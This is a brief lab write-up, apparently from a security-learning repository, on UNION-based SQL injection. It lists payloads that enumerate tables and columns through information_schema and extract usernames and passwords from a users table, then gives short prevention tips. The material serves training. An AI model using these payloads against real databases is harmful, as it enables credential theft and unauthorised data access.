# 🧪 SQL Injection – Listing Database Contents (MySQL / PostgreSQL)

## 📌 Lab: Extract Tables & Data

### 🎯 Objective

Retrieve database structure and data

---

### 🔍 Vulnerability Type

SQL Injection (UNION-based)

---

### ⚙️ Steps Performed

1. Extract tables:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables --
```

2. Extract columns:

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
```

---

### 💉 Payload Used

```sql
' UNION SELECT username, password FROM users --
```

---

### 🧠 Explanation

* `information_schema` stores DB metadata
* Used for enumeration

---

### 📸 Proof of Concept

<img width="1920" height="1080" alt="Lab - 6 - 1" src="https://github.com/user-attachments/assets/2c69cd88-af72-42e5-be71-0ef0afd3311d" />
<img width="1920" height="1080" alt="Lab - 6 - 2" src="https://github.com/user-attachments/assets/c4dd8b41-5fd6-4f1d-b6b4-1a2820f3632f" />
<img width="1920" height="1080" alt="Lab - 6 - 3" src="https://github.com/user-attachments/assets/db0e7cb3-5002-461d-b8ba-83c1a872cab6" />
<img width="1920" height="1080" alt="Lab - 6 - 4" src="https://github.com/user-attachments/assets/74c68ddb-139f-46eb-a30f-8eb1a6b788a3" />
<img width="1917" height="1080" alt="Lab - 6 - 5" src="https://github.com/user-attachments/assets/4482b20a-ae2e-40ca-a16b-f2fe764d39b9" />
<img width="1920" height="1080" alt="Lab - 6 - 4" src="https://github.com/user-attachments/assets/4a1c4e95-a845-4d40-adf4-a1dccbcd0b9d" />
<img width="1920" height="1080" alt="Lab - 6 - 6" src="https://github.com/user-attachments/assets/ebc42ca5-e143-46b7-83eb-834bc98cf8ae" />

---

### ✅ Result

Retrieved sensitive user data.

---

### 🛡️ Prevention

* Hide metadata access
* Use prepared statements
* Input validation

---

### 📚 Learning Outcome

* Learned schema enumeration
* Understood database structure extraction
